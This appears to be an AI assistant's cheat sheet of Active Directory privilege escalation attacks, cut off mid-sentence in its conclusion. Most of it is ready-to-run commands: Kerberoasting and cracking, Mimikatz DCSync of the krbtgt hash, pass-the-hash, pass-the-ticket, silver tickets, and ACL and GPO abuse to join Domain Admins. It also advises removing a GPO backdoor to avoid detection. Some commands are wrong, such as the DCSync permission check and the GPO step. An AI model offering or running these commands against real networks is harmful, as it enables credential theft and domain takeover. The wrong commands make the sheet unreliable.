Yes, Active Directory (AD) privilege escalation attacks are an important aspect of red team and penetration testing engagements. These attacks often target misconfigurations in AD permissions or trust relationships, allowing an attacker to gain elevated privileges, such as Domain Admin (DA) or Enterprise Admin (EA), or to escalate their privileges by abusing specific properties and permissions.

Here's a cheat sheet for **Active Directory Privilege Escalation Attacks**:

---

### **1. BloodHound for AD Enumeration & Path Finding**

#### **Use BloodHound to Find Paths to Domain Admin**
BloodHound is a tool that queries Active Directory for permissions, group memberships, and relationships between users, groups, and computers. It can help find privilege escalation paths.

1. **Collect Data with SharpHound**:
   ```powershell
   Invoke-BloodHound -CollectionMethod All -Domain CONTOSO -ZipFileName loot.zip
   ```

2. **Analyze in BloodHound GUI**:
   - Load the `.zip` file into the BloodHound GUI.
   - Search for "Shortest Path to Domain Admins" to identify potential privilege escalation paths.

---

### **2. Kerberos Attacks**

#### **Kerberoasting (Target Service Accounts)**
Kerberoasting targets accounts that have Service Principal Names (SPNs) configured. If the account's password is weak, an attacker can request a ticket and crack it offline to gain the password.

```powershell
# PowerView to Identify SPNs
Get-DomainUser -SPN | Select-Object Name, ServicePrincipalName

# Request SPN Ticket and Save to File
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack the Ticket (with Hashcat or John)
hashcat -m 13100 hashes.txt /path/to/wordlist
```

---

### **3. Abuse of ACLs (Access Control Lists)**

#### **Abuse Write Permissions on Users/Groups**
If a user has write permissions over a sensitive group (e.g., "Domain Admins") or user object, they can modify the group membership to add themselves or another user to escalate privileges.

1. **Enumerate ACLs on Sensitive AD Objects**:
   ```powershell
   Get-ADACL -DistinguishedName "CN=Domain Admins,CN=Users,DC=domain,DC=com"
   ```

2. **Modify Group Membership if You Have WriteDACL**:
   ```powershell
   Add-ADGroupMember -Identity "Domain Admins" -Members "lowprivuser"
   ```

3. **Abuse `GenericAll` to Add Users to Admin Groups**:
   If you have `GenericAll` rights on a group like "Domain Admins":
   ```powershell
   Add-ADGroupMember -Identity "Domain Admins" -Members "lowprivuser"
   ```

---

### **4. DCSync Attack**

#### **Steal Password Hashes Using DCSync**
The DCSync attack allows an attacker to impersonate a domain controller and request password hashes from AD, if they have `Replicating Directory Changes` permissions.

1. **Check for DCSync Permissions**:
   ```powershell
   Get-ADUser -Filter * -Properties msds-allowedtodelegateto | Select-Object Name, msds-allowedtodelegateto
   ```

2. **Perform DCSync Using Mimikatz**:
   If the user has the right privileges, perform a DCSync attack:
   ```powershell
   Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.com /user:krbtgt"'
   ```

   This dumps the NTLM hash of the `krbtgt` account, which can then be used to forge a **Golden Ticket**.

---

### **5. Pass-the-Hash (PtH)**

#### **Leverage NTLM Hash for Lateral Movement**
If you have an NTLM hash, you can impersonate the account without knowing the cleartext password.

1. **Use Mimikatz for Pass-the-Hash**:
   ```powershell
   Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:powershell.exe"'
   ```

2. **Perform Lateral Movement with PtH**:
   Once authenticated, you can perform lateral movement to other machines using the impersonated credentials:
   ```powershell
   Enter-PSSession -ComputerName TARGET -Credential $creds
   ```

---

### **6. Pass-the-Ticket (PtT)**

#### **Leverage Kerberos Tickets for Privilege Escalation**
With a valid Kerberos Ticket Granting Ticket (TGT) or Ticket Granting Service (TGS), you can impersonate accounts.

1. **Extract Kerberos Tickets Using Mimikatz**:
   ```powershell
   Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
   ```

2. **Pass-the-Ticket (Import Stolen Ticket)**:
   ```powershell
   Invoke-Mimikatz -Command '"kerberos::ptt /ticket:ticket.kirbi"'
   ```

3. **Use Stolen Tickets to Gain Access**:
   With a stolen ticket, you can access resources using the impersonated account.
   ```powershell
   Enter-PSSession -ComputerName TARGET
   ```

---

### **7. GPO Abuse for Privilege Escalation**

#### **Modify GPO for Privilege Escalation**
If you have write access to Group Policy Objects (GPOs), you can abuse this to escalate privileges on multiple machines in the domain.

1. **Identify GPO Permissions**:
   ```powershell
   Get-ACL "LDAP://CN={GPO GUID},CN=Policies,CN=System,DC=domain,DC=com" | Format-List
   ```

2. **Modify GPO to Add a Local Admin**:
   Abuse the GPO by adding a script that adds a user to the local administrators group:
   ```powershell
   Invoke-GPUpdate -Force
   ```

3. **Revert the Changes After Getting Access**:
   Once you have escalated privileges, remove the backdoor from the GPO to avoid detection.

---

### **8. Unconstrained Delegation**

#### **Abuse Unconstrained Delegation for Privilege Escalation**
Unconstrained delegation allows a service to impersonate users who authenticate to it, making it a prime target for attackers.

1. **Find Machines with Unconstrained Delegation**:
   ```powershell
   Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation
   ```

2. **Abuse Unconstrained Delegation**:
   If a high-privileged account (e.g., Domain Admin) authenticates to the vulnerable service, you can steal the TGT from memory using Mimikatz:
   ```powershell
   Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
   ```

3. **Use the Stolen TGT to Escalate Privileges**:
   Use the TGT to authenticate as the high-privileged account and escalate privileges.

---

### **9. Exploiting Group Memberships**

#### **Abuse of "Owner Rights" in ACLs**
If a low-privileged user is the owner of a group or user object, they can escalate privileges by modifying the object’s properties.

1. **Check for Ownership of Sensitive Objects**:
   ```powershell
   Get-ACL -Path "LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=com" | Select Owner
   ```

2. **Change Group Membership as the Owner**:
   If you are the owner of the object, add yourself to the group:
   ```powershell
   Add-ADGroupMember -Identity "Domain Admins" -Members "lowprivuser"
   ```

---

### **10. Abusing LAPS (Local Administrator Password Solution)**

#### **Retrieve LAPS Passwords**
LAPS stores local admin passwords in AD and is used for managing privileged access to local accounts on domain-joined machines.

1. **Find LAPS-Managed Machines**:
   ```powershell
   Get-ADComputer -Filter {ms-MCS-AdmPwd -ne "$null"} -Property ms-MCS-AdmPwd
   ```

2. **Retrieve the LAPS Password**:
   If you have sufficient privileges, retrieve the local admin password:
   ```powershell
   Get-ADComputer -Identity "targetPC" -Property "ms-MCS-AdmPwd"
   ```

---

### **11. Silver Ticket Attack**

#### **Abuse Service Tickets for Privilege Escalation**
A Silver Ticket attack targets specific services in AD and is used to forge a service ticket (TGS) without needing a TGT.

1. **Identify Vulnerable Services**:
   Find SPNs in the domain:
   ```powershell
   Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
   ```

2. **Create a Silver Ticket Using Mimikatz**:
   ```powershell
   Invoke-Mimikatz -Command '"kerberos::golden /domain:domain.com /sid:S-1-5-21-... /target:service /rc4:HASH /user:lowprivuser /service:cifs /id:500"'
   ```

3. **Use the Silver Ticket to Access the Target Service**:
   Use the ticket to authenticate to the target service without needing to authenticate to the Domain Controller.

---

### Conclusion

This cheat sheet provides a quick reference for common **